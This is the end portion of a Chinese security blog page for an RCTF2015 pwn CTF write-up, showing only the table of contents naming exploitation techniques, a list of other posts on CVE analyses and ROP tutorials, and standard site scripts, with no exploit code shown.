</article>






    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shaxian-pwn400"><span class="toc-text">shaxian-pwn400</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-检查程序开启的保护机制"><span class="toc-text">0x00 检查程序开启的保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-静态分析"><span class="toc-text">0x10 静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-方法一：对libc库中的函数偏移进行爆破。"><span class="toc-text">0x20 方法一：对libc库中的函数偏移进行爆破。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x30-方法二：使用ret2-dl-runtime-resolve方式进行利用。"><span class="toc-text">0x30 方法二：使用ret2_dl_runtime_resolve方式进行利用。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x31-内存的布局"><span class="toc-text">0x31 内存的布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x32-本方法使用的内存布局"><span class="toc-text">0x32 本方法使用的内存布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x33-利用思路"><span class="toc-text">0x33 利用思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#welpwn-pwn200"><span class="toc-text">welpwn-pwn200</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-检查程序开启的保护机制-1"><span class="toc-text">0x00 检查程序开启的保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-静态分析-1"><span class="toc-text">0x10 静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x20-方法一：如果提供了libc-so，栈喷射-覆盖main’s-rbp最低字节，转移main函数rbp到rop代码处。ret2libc。"><span class="toc-text">0x20 方法一：如果提供了libc.so，栈喷射+覆盖main’s rbp最低字节，转移main函数rbp到rop代码处。ret2libc。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x30-方法二：如果提供了libc-so，使用-libc-csu-init中的通用gadgets构造ROP-chain。ret2libc。"><span class="toc-text">0x30 方法二：如果提供了libc.so，使用__libc_csu_init中的通用gadgets构造ROP chain。ret2libc。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x40-方法三：如果未提供libc-so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。"><span class="toc-text">0x40 方法三：如果未提供libc.so，使用pwntools的DynELF模块对库函数地址进行泄露。ret2libc。</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
    </script>



    
    <div class="share">
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"RCTF2015——WriteUp(Pwn)　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>




    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2020/08/15/ret2_dl_runtime_resolve详解/" title="上一篇: ret2_dl_runtime_resolve详解">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/" title="下一篇: ZCTF2016——WriteUp(Pwn)">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/14/TEB_and_PEB/">TEB和PEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/22/BlackHat USA 2010 - Understanding the Low Fragmentation Heap/">翻译 - BlackHat USA 2010 - Understanding the Low Fragmentation Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/16/CVE-2012-1876复现与分析/">CVE-2012-1876复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/10/CVE-2010-2553复现与分析/">CVE-2010-2553复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/AVI文件格式分析/">AVI文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2021 Sp4n9x
            </div>
            <div class="footer-right">
                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 10;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
             post: ".article-entry a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
    <!-- 点击爱心效果 -->
    <script src="/js/love.js"></script>
  </div>
</body>
</html>